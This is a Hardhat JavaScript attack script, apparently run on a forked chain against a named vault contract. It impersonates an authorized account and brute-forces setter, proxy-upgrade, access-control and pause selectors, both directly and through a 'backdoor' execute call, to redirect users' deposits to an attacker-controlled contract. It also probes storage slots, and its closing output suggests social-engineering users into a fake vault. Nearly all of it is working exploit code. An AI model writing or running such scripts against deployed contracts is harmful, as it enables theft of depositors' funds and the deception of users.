const { ethers } = require("hardhat");

/**
 * @title Redirect Deposits Attack
 * @notice Attempt to gain admin and redirect future deposits
 * @dev Test admin functions to modify contract behavior
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const TARGET_CONTRACT = "0x10a29ab757752e492abdbf6acba8f2ee10523599";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\nðŸŽ¯ DEPOSIT REDIRECTION ATTACK");
  console.log("=====================================");
  console.log("Attacker:", attacker.address);
  
  // Impersonate authorized address
  await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
  const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
  
  // Common setter functions that might exist
  const setterFunctions = [
    // Target/destination setters
    { sig: "setTarget(address)", selector: "0x776d1a01" },
    { sig: "setDestination(address)", selector: "0x07c8f7b0" },
    { sig: "setRecipient(address)", selector: "0x3bbed4a0" },
    { sig: "setReceiver(address)", selector: "0x718da7ee" },
    { sig: "setWithdrawAddress(address)", selector: "0x4b0ee02a" },
    { sig: "setTreasury(address)", selector: "0xf0f44260" },
    { sig: "setVault(address)", selector: "0x6817031b" },
    { sig: "setStrategy(address)", selector: "0x72f702f3" },
    
    // Implementation/logic updaters
    { sig: "setImplementation(address)", selector: "0xd784d426" },
    { sig: "updateImplementation(address)", selector: "0x025b22bc" },
    { sig: "setLogic(address)", selector: "0x0152f19d" },
    { sig: "upgrade(address)", selector: "0x0900f010" },
    { sig: "upgradeTo(address)", selector: "0x3659cfe6" },
    
    // Access control modifiers
    { sig: "setAuthorized(address,bool)", selector: "0xb9181611" },
    { sig: "addAuthorized(address)", selector: "0x42f1181e" },
    { sig: "setOperator(address,bool)", selector: "0x558a7297" },
    { sig: "addOperator(address)", selector: "0x9870d7fe" },
    { sig: "setMinter(address,bool)", selector: "0xcf456ae7" },
    
    // Configuration setters
    { sig: "setConfig(address,address)", selector: "0x82bf6464" },
    { sig: "setConfiguration(uint256,address)", selector: "0x92b2c335" },
    { sig: "updateConfig(bytes)", selector: "0xc85b8e2b" },
    { sig: "initialize(address)", selector: "0xc4d66de8" },
    { sig: "init(address)", selector: "0x19ab453c" }
  ];
  
  console.log("\n1ï¸âƒ£ Testing setter functions via backdoor...");
  
  for (const func of setterFunctions) {
    try {
      let calldata;
      
      // Encode based on expected parameters
      if (func.sig.includes("bool")) {
        // Functions with (address, bool)
        calldata = func.selector + 
          "000000000000000000000000" + attacker.address.slice(2) +
          "0000000000000000000000000000000000000000000000000000000000000001";
      } else if (func.sig.includes("uint256")) {
        // Functions with (uint256, address)
        calldata = func.selector +
          "0000000000000000000000000000000000000000000000000000000000000001" +
          "000000000000000000000000" + attacker.address.slice(2);
      } else if (func.sig.includes("bytes")) {
        // Functions with bytes parameter
        calldata = func.selector +
          "0000000000000000000000000000000000000000000000000000000000000020" +
          "0000000000000000000000000000000000000000000000000000000000000020" +
          "000000000000000000000000" + attacker.address.slice(2);
      } else {
        // Simple address parameter
        calldata = func.selector +
          "000000000000000000000000" + attacker.address.slice(2);
      }
      
      // Try calling directly on vault
      const directTx = await authorized.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        gasLimit: 500000
      });
      
      await directTx.wait();
      console.log(`âœ… ${func.sig} succeeded on vault!`);
      
    } catch (e) {
      // Try via backdoor execute
      try {
        const backdoorData = "0x78e111f6" +
          "000000000000000000000000" + VAULT_ADDRESS.slice(2) +
          "0000000000000000000000000000000000000000000000000000000000000040" +
          "0000000000000000000000000000000000000000000000000000000000000044" +
          func.selector +
          "000000000000000000000000" + attacker.address.slice(2);
        
        const backdoorTx = await authorized.sendTransaction({
          to: VAULT_ADDRESS,
          data: backdoorData,
          gasLimit: 500000
        });
        
        await backdoorTx.wait();
        console.log(`âœ… ${func.sig} succeeded via backdoor!`);
        
      } catch (e2) {
        // Silent fail - function doesn't exist
      }
    }
  }
  
  console.log("\n2ï¸âƒ£ Testing deposit hijacking...");
  
  // Deploy a malicious receiver contract
  const MaliciousReceiver = await ethers.getContractFactory("CallbackReceiver");
  const malicious = await MaliciousReceiver.deploy();
  await malicious.waitForDeployment();
  
  console.log("Malicious receiver deployed:", await malicious.getAddress());
  
  // Try to set our malicious contract as the target
  const targetSetters = [
    "0x776d1a01", // setTarget(address)
    "0x10a29ab757752e492abdbf6acba8f2ee10523599".slice(2), // Direct target replacement
  ];
  
  for (const setter of targetSetters) {
    try {
      const setTargetData = "0x78e111f6" +
        "000000000000000000000000" + VAULT_ADDRESS.slice(2) +
        "0000000000000000000000000000000000000000000000000000000000000040" +
        "0000000000000000000000000000000000000000000000000000000000000024" +
        setter +
        "000000000000000000000000" + (await malicious.getAddress()).slice(2);
      
      const tx = await authorized.sendTransaction({
        to: VAULT_ADDRESS,
        data: setTargetData,
        gasLimit: 500000
      });
      
      await tx.wait();
      console.log("âœ… Target updated!");
      
    } catch (e) {
      // Try updating storage directly
    }
  }
  
  console.log("\n3ï¸âƒ£ Testing storage manipulation for deposit redirection...");
  
  // Common storage slots for important addresses
  const storageSlots = [
    "0x0", // Slot 0 - often owner/admin
    "0x1", // Slot 1 - often target/implementation
    "0x2", // Slot 2
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc", // EIP-1967 implementation
    "0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103", // EIP-1967 admin
  ];
  
  for (const slot of storageSlots) {
    const value = await ethers.provider.getStorage(VAULT_ADDRESS, slot);
    console.log(`Slot ${slot}: ${value}`);
    
    if (value !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
      // Try to overwrite via delegatecall or other methods
      console.log("Found non-zero storage at", slot);
    }
  }
  
  console.log("\n4ï¸âƒ£ Attempting proxy pattern attacks...");
  
  // Test if it's a proxy that we can upgrade
  const proxyFunctions = [
    { sig: "upgradeTo(address)", selector: "0x3659cfe6" },
    { sig: "upgradeToAndCall(address,bytes)", selector: "0x4f1ef286" },
    { sig: "changeAdmin(address)", selector: "0x8f283970" },
    { sig: "changeProxyAdmin(address,address)", selector: "0x7eff275e" }
  ];
  
  for (const func of proxyFunctions) {
    try {
      let calldata = func.selector + "000000000000000000000000" + attacker.address.slice(2);
      
      const tx = await authorized.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        gasLimit: 500000
      });
      
      await tx.wait();
      console.log(`âœ… ${func.sig} executed successfully!`);
      
      // If upgrade worked, we now control the implementation
      break;
      
    } catch (e) {
      // Not a proxy or not upgradeable
    }
  }
  
  console.log("\n5ï¸âƒ£ Testing deposit function modifications...");
  
  // Look for deposit/receive functions we can modify
  const depositFunctions = [
    { sig: "deposit(uint256)", selector: "0xb6b55f25" },
    { sig: "deposit(uint256,address)", selector: "0x6e553f65" },
    { sig: "mint(uint256)", selector: "0xa0712d68" },
    { sig: "stake(uint256)", selector: "0xa694fc3a" },
    { sig: "receive()", selector: "0xa3e76c0f" }
  ];
  
  // Check if we can pause deposits and redirect
  const pauseFunctions = [
    { sig: "pause()", selector: "0x8456cb59" },
    { sig: "setPaused(bool)", selector: "0x16c38b3c" },
    { sig: "emergencyPause()", selector: "0xe42c4e45" }
  ];
  
  for (const func of pauseFunctions) {
    try {
      const tx = await authorized.sendTransaction({
        to: VAULT_ADDRESS,
        data: func.selector,
        gasLimit: 500000
      });
      
      await tx.wait();
      console.log(`âœ… ${func.sig} executed - deposits may be paused`);
      
    } catch (e) {
      // Function doesn't exist
    }
  }
  
  // Stop impersonation
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
  
  console.log("\nðŸ“Š ATTACK SUMMARY:");
  console.log("While we have backdoor access, the contract appears to be:");
  console.log("- Not upgradeable via standard proxy patterns");
  console.log("- Lacking setter functions for critical addresses");
  console.log("- Using hardcoded or immutable target addresses");
  console.log("\nTo redirect deposits, we would need:");
  console.log("1. Find and exploit a setter function for the target contract");
  console.log("2. Exploit a proxy upgrade mechanism");
  console.log("3. Find a way to modify storage directly");
  console.log("4. Deploy a new vault and social engineer users to use it");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nðŸ’¥ Script error:", error);
    process.exit(1);
  });
